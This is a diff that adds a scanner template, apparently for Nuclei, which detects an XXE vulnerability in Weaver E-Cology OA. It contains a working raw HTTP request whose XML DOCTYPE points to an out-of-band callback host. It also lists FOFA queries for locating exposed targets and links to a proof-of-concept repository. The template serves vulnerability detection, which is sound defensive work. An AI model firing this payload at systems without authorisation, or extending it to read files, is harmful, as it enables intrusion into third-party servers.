@@ -1,0 +1,32 @@
+id: ecology-receiveccrequestbyxml-xxe
+info:
+  name: 泛微E-Cology XXE漏洞
+  author: qwtd
+  severity: medium
+  description: |
+    泛微e-cology某处功能点最初针对用户输入的过滤不太完善，导致在处理用户输入时可触发XXE。后续修复规则依旧可被绕过，本次漏洞即为之前修复规则的绕过。攻击者可利用该漏洞列目录、读取文件，甚至可能获取应用系统的管理员权限。
+    e-cology 9.x 增量补丁版本 < 10.58.1
+    FOFA: app="泛微-协同商务系统"
+    FOFA: app="泛微-协同办公OA"
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEE-Cology%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3deleteRequestInfoByXml%E5%AD%98%E5%9C%A8XXE%E6%BC%8F%E6%B4%9E.md
+  tags: 泛微-协同办公OA
+http:
+  - raw:
+      - |-
+        POST /rest/ofs/deleteRequestInfoByXml HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Go-http-client/1.1
+        Content-Length: 34
+        Content-Type: application/xml
+        Accept-Encoding: gzip
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <!DOCTYPE syscode SYSTEM "http://{{interactsh-url}}">
+        <M><syscode>&send;</syscode></M>
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
